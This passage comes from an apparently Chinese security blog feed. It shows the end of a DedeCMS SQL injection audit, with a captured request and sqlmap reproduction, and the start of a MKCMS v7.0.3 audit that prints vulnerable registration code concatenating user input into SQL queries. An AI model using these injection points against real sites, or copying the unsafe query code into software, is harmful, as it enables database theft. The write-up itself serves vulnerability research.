&quot;，继续进行操作...&quot;, $gourl, 0, 100);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$dsql-&gt;ExecuteNoneQuery(&quot;Update &#96;#@__freelist&#96; set  nodefault&#x3D;&#39;1&#39; where aid&#x3D;&#39;$startid&#39;;&quot;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>The problem is very simple. You can see that in line 16, a judgment is made on <code>starid</code>. If the value of this parameter is <strong>NULL</strong>, then <code>0</code> is assigned to <code>starid</code>. Then on line 20, the value of <code>starid</code> is passed to <code>ci</code>, but on line 25, <code>ci</code> is concatenated into the database statement without any filtering, causing the problem<br><img src="https://img.imgdb.cn/item/605da8168322e6675c7178c4.png"></p><h1 id="Local-Recurrence"><a href="#Local-Recurrence" class="headerlink" title="Local Recurrence"></a>Local Recurrence</h1><p>Download the source code on GitHub for installation, source address:<strong><a href="https://github.com/dedecms/DedeCMS">https://github.com/dedecms/DedeCMS</a></strong><br>Use the account password set at the time of installation to enter the background, the default is <code>admin/admin</code><br>completing:<br><img src="https://img.imgdb.cn/item/605daafc8322e6675c7356f6.png"></p><p>Enter the vulnerability point：<code>http://192.168.5.62:81/dede/makehtml_freelist_action.php?startid=2</code>,Use the BurpSuit to grab the packet from this page</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F;dede&#x2F;makehtml_freelist_action.php?startid&#x3D;2 HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.5.62:81</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;88.0.4324.150 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;mrb3nr8o749ivis4ht88l6l0bg; _csrf_name_82f99071&#x3D;034d348b605717cf5b1cd83a1d8b8bd8; _csrf_name_82f99071__ckMd5&#x3D;72f306a6331ccc26; DedeUserID&#x3D;1; DedeUserID__ckMd5&#x3D;8e635ad267f5c9bb; DedeLoginTime&#x3D;1616745752; DedeLoginTime__ckMd5&#x3D;d8bf0218bdaada0b</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>Resend the original packet<br><img src="https://img.imgdb.cn/item/605dac3c8322e6675c7413e3.png"></p><p>Add <code>&#39;</code>after <code>startid</code>.See the <code>render</code>.Something is different, which means the database is responding<br><img src="https://img.imgdb.cn/item/605dacce8322e6675c746ffd.png"></p><p>Now, drop the raw packet into <code>sqlmap</code>,It’s worth noting that there are two hints,<strong>I select no</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Cookie parameter &#39;_csrf_name_82f99071&#39; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y&#x2F;N] n</span><br><span class="line">Cookie parameter &#39;_csrf_name_82f99071__ckMd5&#39; appears to hold anti-CSRF token. Do you want sqlmap to automatically update it in further requests? [y&#x2F;N] n</span><br></pre></td></tr></table></figure><p>The end result<br><img src="https://img.imgdb.cn/item/605dade18322e6675c751a47.png"></p><p>We can also try to get the database<br><img src="https://img.imgdb.cn/item/605dae3b8322e6675c75593b.png"></p>]]></content>
    
    
    <summary type="html">dedecms最新版代码审计</summary>
    
    
    
    <category term="代码审计" scheme="http://nice759.com/Categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="php" scheme="http://nice759.com/tags/php/"/>
    
    <category term="代码审计" scheme="http://nice759.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>米酷CMS v7.0.3 sql注入漏洞审计及本地复现</title>
    <link href="http://nice759.com/2021/03/24/%E7%B1%B3%E9%85%B7CMS%20v7.0.3%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/"/>
    <id>http://nice759.com/2021/03/24/%E7%B1%B3%E9%85%B7CMS%20v7.0.3%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%8F%8A%E6%9C%AC%E5%9C%B0%E5%A4%8D%E7%8E%B0/</id>
    <published>2021-03-24T02:28:15.000Z</published>
    <updated>2021-03-24T03:43:37.419Z</updated>
    
    <content type="html"><![CDATA[<h1 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h1><p>米酷影视管理系统是一套专为不同需求的站长而设计的影视管理系统，灵活，方便，人性化设计简单易用是最大的特色，是快速架设视频网站首选，只需 3 分钟即可建立一个海量的视频讯息的行业网站。<br><a href="https://www.mkcms.com/">米酷CMS v7.0.3</a>版本<code>admin/model/admin_edit.php</code>、<code>ucenter/reg.php</code>等文件存在漏洞，攻击者可以利用漏洞进行sql注入攻击。</p><h1 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h1><p>米酷CMS v7.0.3</p><h1 id="第一处注入"><a href="#第一处注入" class="headerlink" title="第一处注入"></a>第一处注入</h1><ul><li><strong>漏洞文件</strong><br><code>ucenter/reg.php</code> （前台文件）</li><li><strong>分析</strong><br>在<code>reg.php</code>这个文件中，第9行处对<code>$username</code>这个参数进行了查询拼接<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">include(&#39;..&#x2F;system&#x2F;inc.php&#39;);</span><br><span class="line">if(isset($_SESSION[&#39;user_name&#39;]))&#123;</span><br><span class="line">header(&#39;location:index.php&#39;);</span><br><span class="line">&#125;;</span><br><span class="line">if(isset($_POST[&#39;submit&#39;]))&#123;</span><br><span class="line">$username &#x3D; stripslashes(trim($_POST[&#39;name&#39;]));</span><br><span class="line">&#x2F;&#x2F; 检测用户名是否存在</span><br><span class="line">$query &#x3D; mysqli_query($conn,&quot;select u_id from mkcms_user where u_name&#x3D;&#39;$username&#39;&quot;);</span><br><span class="line">if(mysqli_fetch_array($query))&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;用户名已存在，请换个其他的用户名&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">$result &#x3D; mysqli_query($conn,&#39;select * from mkcms_user where u_email &#x3D; &quot;&#39;.$_POST[&#39;email&#39;].&#39;&quot;&#39;);</span><br><span class="line">if(mysqli_fetch_array($result))&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;邮箱已存在，请换个其他的邮箱&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">exit;</span><br><span class="line">&#125;</span><br><span class="line">$password &#x3D; md5(trim($_POST[&#39;password&#39;]));</span><br><span class="line">$email &#x3D; trim($_POST[&#39;email&#39;]);</span><br><span class="line">$regtime &#x3D; time();</span><br><span class="line">$token &#x3D; md5($username.$password.$regtime); &#x2F;&#x2F;创建用于激活识别码</span><br><span class="line">$token_exptime &#x3D; time()+60*60*24;&#x2F;&#x2F;过期时间为24小时后</span><br><span class="line">$data[&#39;u_name&#39;] &#x3D; $username;</span><br><span class="line">$data[&#39;u_password&#39;] &#x3D;$password;</span><br><span class="line">$data[&#39;u_email&#39;] &#x3D; $email;</span><br><span class="line">$data[&#39;u_regtime&#39;] &#x3D;$regtime;</span><br><span class="line">if($mkcms_mail&#x3D;&#x3D;1)&#123;</span><br><span class="line">$data[&#39;u_status&#39;] &#x3D;0;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$data[&#39;u_status&#39;] &#x3D;1;</span><br><span class="line">&#125;</span><br><span class="line">$data[&#39;u_group&#39;] &#x3D;1;</span><br><span class="line">$data[&#39;u_fav&#39;] &#x3D;0;</span><br><span class="line">$data[&#39;u_plays&#39;] &#x3D;0;</span><br><span class="line">$data[&#39;u_downs&#39;] &#x3D;0;</span><br><span class="line">&#x2F;&#x2F;推广注册</span><br><span class="line">if (isset($_GET[&#39;tg&#39;])) &#123;</span><br><span class="line">$data[&#39;u_qid&#39;] &#x3D;$_GET[&#39;tg&#39;];</span><br><span class="line">$result &#x3D; mysqli_query($conn,&#39;select * from mkcms_user where u_id&#x3D;&quot;&#39;.$_GET[&#39;tg&#39;].&#39;&quot;&#39;);</span><br><span class="line">if($row &#x3D; mysqli_fetch_array($result))&#123;</span><br><span class="line"></span><br><span class="line">$u_points&#x3D;$row[&#39;u_points&#39;];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$_data[&#39;u_points&#39;] &#x3D;$u_points+$mkcms_tuiguang;</span><br><span class="line">$sql &#x3D; &#39;update mkcms_user set &#39;.arrtoupdate($_data).&#39; where u_id&#x3D;&quot;&#39;.$_GET[&#39;tg&#39;].&#39;&quot;&#39;;</span><br><span class="line">if (mysqli_query($conn,$sql)) &#123;&#125;</span><br><span class="line">$data[&#39;u_question&#39;] &#x3D;$token;</span><br><span class="line">$str &#x3D; arrtoinsert($data);</span><br><span class="line">$sql &#x3D; &#39;insert into mkcms_user (&#39;.$str[0].&#39;) values (&#39;.$str[1].&#39;)&#39;;</span><br><span class="line">if (mysqli_query($conn,$sql)) &#123;</span><br><span class="line">if($mkcms_mail&#x3D;&#x3D;1)&#123;</span><br><span class="line">&#x2F;&#x2F;写入数据库成功，发邮件</span><br><span class="line">include(&quot;emailconfig.php&quot;);</span><br><span class="line">    &#x2F;&#x2F;创建$smtp对象 这里面的一个true是表示使用身份验证,否则不使用身份验证.</span><br><span class="line">    $smtp &#x3D; new Smtp($MailServer, $MailPort, $smtpuser, $smtppass, true); </span><br><span class="line">    $smtp-&gt;debug &#x3D; false; </span><br><span class="line">    $mailType &#x3D; &quot;HTML&quot;; &#x2F;&#x2F;信件类型，文本:text；网页：HTML</span><br><span class="line">    $email &#x3D; $email;  &#x2F;&#x2F;收件人邮箱</span><br><span class="line">    $emailTitle &#x3D; &quot;&quot;.$mkcms_name.&quot;用户账号激活&quot;; &#x2F;&#x2F;邮件主题</span><br><span class="line">    $emailBody &#x3D; &quot;亲爱的&quot;.$username.&quot;：&lt;br&#x2F;&gt;感谢您在我站注册了新账号。&lt;br&#x2F;&gt;请点击链接激活您的账号。&lt;br&#x2F;&gt;&lt;a href&#x3D;&#39;&quot;.$mkcms_domain.&quot;ucenter&#x2F;active.php?verify&#x3D;&quot;.$token.&quot;&#39; target&#x3D;&#39;_blank&#39;&gt;&quot;.$mkcms_domain.&quot;ucenter&#x2F;active.php?verify&#x3D;&quot;.$token.&quot;&lt;&#x2F;a&gt;&lt;br&#x2F;&gt;如果以上链接无法点击，请将它复制到你的浏览器地址栏中进入访问，该链接24小时内有效。&lt;br&#x2F;&gt;如果此次激活请求非你本人所发，请忽略本邮件。&lt;br&#x2F;&gt;&lt;p style&#x3D;&#39;text-align:right&#39;&gt;-------- &quot;.$mkcms_name.&quot; 敬上&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F; sendmail方法</span><br><span class="line">    &#x2F;&#x2F; 参数1是收件人邮箱</span><br><span class="line">    &#x2F;&#x2F; 参数2是发件人邮箱</span><br><span class="line">    &#x2F;&#x2F; 参数3是主题（标题）</span><br><span class="line">    &#x2F;&#x2F; 参数4是邮件主题（标题）</span><br><span class="line">    &#x2F;&#x2F; 参数4是邮件内容  参数是内容类型文本:text 网页:HTML</span><br><span class="line">    $rs &#x3D; $smtp-&gt;sendmail($email, $smtpMail, $emailTitle, $emailBody, $mailType);</span><br><span class="line">if($rs&#x3D;&#x3D;true)&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;恭喜您，注册成功！请登录到您的邮箱及时激活您的账号！&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;恭喜您，注册成功！&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">if($mkcms_smsname!&#x3D;&quot;&quot;)&#123;</span><br><span class="line">if($_POST[&#39;txtsmscode&#39;]&#x3D;&#x3D;&quot;&quot; || $_POST[&#39;txtsmscode&#39;]!&#x3D;$_SESSION[&#39;mobilecode&#39;])&#123;</span><br><span class="line">echo &quot;&lt;script type&#x3D;&#39;text&#x2F;javascript&#39;&gt;alert(&#39;短信验证码不能为空！&#39;);history.go(-1);&lt;&#x2F;script&gt;&quot;; </span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">echo &#39;&lt;script&gt;alert(&quot;恭喜您，注册成功！&quot;);window.history.go(-1);&lt;&#x2F;script&gt;&#39;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php include(&#39;..&#x2F;template&#x2F;&#39;.$mkcms_bdyun.&#39;&#x2F;head.php&#39;);?&gt;</span><br><span class="line">&lt;title&gt;会员登录-&lt;?php echo $mkcms_seoname;?&gt;&lt;&#x2F;title&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;keywords&quot; content&#x3D;&quot;&lt;?php echo $mkcms_keywords;?&gt;&quot;&gt;</span><br><span class="line">&lt;meta name&#x3D;&quot;description&quot; content&#x3D;&quot;&lt;?php echo $mkcms_description;?&gt;&quot;&gt;</span><br><span class="line">&lt;link rel&#x3D;&quot;stylesheet&quot; media&#x3D;&quot;screen&quot; href&#x3D;&quot;css&#x2F;main.css&quot; &#x2F;&gt;</span><br><span class="line">&lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;</span><br><span class="line">.p-imgcon &#123;margin-top: -30px;height: 500px;background-color: #e6e6e6;background: #fff url(&lt;?php</span><br><span class="line">$text&#x3D;file_get_contents(&#39;https:&#x2F;&#x2F;i.360kan.com&#x2F;login&#39;); </span><br><span class="line">$link&#x3D;&quot;#&lt;a href&#x3D;&#39;https:&#x2F;&#x2F;www.360kan.com&#x2F;(.*?)&#39;&gt;&lt;&#x2F;a&gt;#&quot;;</span><br><span class="line">preg_match_all($link,$text,$sarr);</span><br><span class="line">$link1&#x3D;$sarr[1][0];</span><br><span class="line">$link2&#x3D;&quot;&#x2F;vod&#x2F;&quot;.$link1;</span><br><span class="line">preg_match(&#39;&#x2F;https[^&gt;]*jpg&#x2F;Ui&#39;, $text, $match);</span><br><span class="line">print($match[0]);</span><br><span class="line">?&gt;) center 0 no-repeat;&#125;</span><br><span class="line">.login-section &#123;margin: 30px 15px 0 auto;&#125;</span><br><span class="line">@media (max-width: 768px)&#123; #imgcon1&#123;display:none;&#125;&#125;</span><br><span class="line">#imgcon1 a&#123; display:block; width:48%;height:500px; position:absolute;z-index:999;&#125;</span><br><span class="line">&lt;&#x2F;style&gt;</span><br><span class="line">&lt;!--[if lt IE 9]&gt;    </span><br><span class="line">&lt;script src&#x3D;&quot;..&#x2F;style&#x2F;js&#x2F;html5shiv.js&quot;&gt;&lt;&#x2F;script&gt;   </span><br><span class="line">&lt;script src&#x3D;&quot;..&#x2F;style&#x2F;js&#x2F;respond.min.js&quot;&gt;&lt;&#x2F;script&gt;  </span><br><span class="line">&lt;![endif]--&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">function chk_form()&#123;</span><br><span class="line">var tel &#x3D; document.getElementById(&quot;tel&quot;);</span><br><span class="line">if(tel.value&#x3D;&#x3D;&quot;&quot;)&#123;</span><br><span class="line">alert(&quot;用户名不能为空！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;user.focus();</span><br><span class="line">&#125;</span><br><span class="line">var pass &#x3D; document.getElementById(&quot;pass&quot;);</span><br><span class="line">if(pass.value&#x3D;&#x3D;&quot;&quot;)&#123;</span><br><span class="line">alert(&quot;密码不能为空！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;pass.focus();</span><br><span class="line">&#125;</span><br><span class="line">var email &#x3D; document.getElementById(&quot;email&quot;);</span><br><span class="line">if(email.value&#x3D;&#x3D;&quot;&quot;)&#123;</span><br><span class="line">alert(&quot;Email不能为空！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;email.focus();</span><br><span class="line">&#125;</span><br><span class="line">var preg &#x3D; &#x2F;^\w+([-+.]\w+)*@\w+([-.]\w+)*\.\w+([-.]\w+)*&#x2F;; &#x2F;&#x2F;匹配Email</span><br><span class="line">if(!preg.test(email.value))&#123; </span><br><span class="line">alert(&quot;Email格式错误！&quot;);</span><br><span class="line">return false;</span><br><span class="line">&#x2F;&#x2F;email.focus();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">&#x2F;*-------------------------------------------*&#x2F;</span><br><span class="line">var InterValObj; &#x2F;&#x2F;timer变量，控制时间</span><br><span class="line">var count &#x3D; 60; &#x2F;&#x2F;间隔函数，1秒执行</span><br><span class="line">var curCount;&#x2F;&#x2F;当前剩余秒数</span><br><span class="line">var code &#x3D; &quot;&quot;; &#x2F;&#x2F;验证码</span><br><span class="line">var codeLength &#x3D; 6;&#x2F;&#x2F;验证码长度</span><br><span class="line">function sendMessage() &#123;</span><br><span class="line">curCount &#x3D; count;</span><br><span class="line">var dealType; &#x2F;&#x2F;验证方式</span><br><span class="line">tel &#x3D; $(&#39;#tel&#39;).val();</span><br><span class="line">    if(tel!&#x3D;&#39;&#39;)&#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;验证手机有效性</span><br><span class="line"> var myreg &#x3D; &#x2F;^(((13[0-9]&#123;1&#125;)|(15[0-9]&#123;1&#125;)|(17[0-9]&#123;1&#125;)|(14[0-9]&#123;1&#125;)|(18[0-9]&#123;1&#125;))+\d&#123;8&#125;)$&#x2F;; </span><br><span class="line">            if(!myreg.test($(&#39;#tel&#39;).val())) </span><br><span class="line">          &#123; </span><br><span class="line">             alert(&#39;请输入有效的手机号码！&#39;); </span><br><span class="line">             return false; </span><br><span class="line">          &#125; </span><br><span class="line">tel &#x3D; $(&#39;#tel&#39;).val();</span><br><span class="line">   &#x2F;&#x2F;产生验证码</span><br><span class="line">for (var i &#x3D; 0; i &lt; codeLength; i++) &#123;</span><br><span class="line">code +&#x3D; parseInt(Math.random() * 9).toString();</span><br><span class="line">&#125;</span><br><span class="line">&#x2F;&#x2F;设置button效果，开始计时</span><br><span class="line">$(&quot;#btnSendCode&quot;).attr(&quot;disabled&quot;, &quot;true&quot;);</span><br><span class="line">$(&quot;#btnSendCode&quot;).val(&quot;请在&quot; + curCount + &quot;秒内输入&quot;);</span><br><span class="line">InterValObj &#x3D; window.setInterval(SetRemainTime, 1000); &#x2F;&#x2F;启动计时器，1秒执行一次</span><br><span class="line">&#x2F;&#x2F;向后台发送处理数据</span><br><span class="line">                $.ajax(&#123;</span><br><span class="line">                    type: &quot;POST&quot;, &#x2F;&#x2F;用POST方式传输</span><br><span class="line">                    dataType: &quot;text&quot;, &#x2F;&#x2F;数据格式:JSON</span><br><span class="line">                    url: &#39;&#x2F;ucenter&#x2F;yanzhengma.php&#39;, &#x2F;&#x2F;目标地址</span><br><span class="line">                    data: &quot;&amp;tel&#x3D;&quot; + tel + &quot;&amp;code&#x3D;&quot; + code,</span><br><span class="line">                    error: function (XMLHttpRequest, textStatus, errorThrown) &#123; &#125;,</span><br><span class="line">                    success: function (msg)&#123; &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line">        &#125;else&#123;</span><br><span class="line">alert(&#39;请填写手机号码&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">&#x2F;&#x2F;timer处理函数</span><br><span class="line">function SetRemainTime() &#123;</span><br><span class="line">if (curCount &#x3D;&#x3D; 0) &#123;                </span><br><span class="line">window.clearInterval(InterValObj);&#x2F;&#x2F;停止计时器</span><br><span class="line">$(&quot;#btnSendCode&quot;).removeAttr(&quot;disabled&quot;);&#x2F;&#x2F;启用按钮</span><br><span class="line">$(&quot;#btnSendCode&quot;).val(&quot;重新发送验证码&quot;);</span><br><span class="line">code &#x3D; &quot;&quot;; &#x2F;&#x2F;清除验证码。如果不清除，过时间后，输入收到的验证码依然有效    </span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">curCount--;</span><br><span class="line">$(&quot;#btnSendCode&quot;).val(&quot;请在&quot; + curCount + &quot;秒内输入&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    &lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body style&#x3D;&quot;padding-top: 60px;&quot;&gt;</span><br><span class="line">&lt;?php include(&#39;..&#x2F;template&#x2F;&#39;.$mkcms_bdyun.&#39;&#x2F;header.php&#39;);?&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;imgcon1&quot;&gt;</span><br><span class="line">&lt;a href&#x3D;&quot;&lt;?php echo $link2;?&gt;&quot; target&#x3D;&quot;_blank&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;div id&#x3D;&quot;wrapper&quot; class&#x3D;&quot;pad-bottom p-imgcon&quot;&gt;</span><br><span class="line">   &lt;div id&#x3D;&quot;content-container&quot; class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;es-section login-section&quot;&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;logon-tab clearfix&quot;&gt;</span><br><span class="line">    &lt;a href&#x3D;&quot;login.php&quot;&gt;登录账号&lt;&#x2F;a&gt;</span><br><span class="line">    &lt;a class&#x3D;&quot;active&quot;&gt;注册账号&lt;&#x2F;a&gt;</span><br><span class="line">  &lt;&#x2F;div&gt;</span><br><span class="line">  &lt;div class&#x3D;&quot;login-main&quot;&gt;</span><br><span class="line">      &lt;form class&#x3D;&quot;form-horizontal js-ajax-form&quot;  method&#x3D;&quot;post&quot; onsubmit&#x3D;&quot;return chk_form();&quot;&gt;</span><br><span class="line">   &lt;label class&#x3D;&quot;control-label required&quot;&gt;账号&lt;&#x2F;label&gt;</span><br><span class="line">       &lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;name&quot; id&#x3D;&quot;tel&quot; placeholder&#x3D;&quot;作为登录账号使用&quot; value&#x3D;&quot;&quot; class&#x3D;&quot;form-control input-lg span4&quot;&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">   &lt;label class&#x3D;&quot;control-label required&quot; &gt;邮箱&lt;&#x2F;label&gt;</span><br><span class="line">       &lt;div class&#x3D;&quot;control-group&quot; style&#x3D;&quot;margin-bottom:10px;&quot;&gt;</span><br><span class="line"> &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;email&quot; id&#x3D;&quot;email&quot; placeholder&#x3D;&quot;邮箱&quot; class&#x3D;&quot;form-control input-lg span4&quot;&gt;</span><br><span class="line">   &lt;&#x2F;div&gt;</span><br><span class="line">&lt;?php if($mkcms_smsname!&#x3D;&quot;&quot;)&#123;?&gt;</span><br><span class="line">&lt;label class&#x3D;&quot;control-label required&quot; 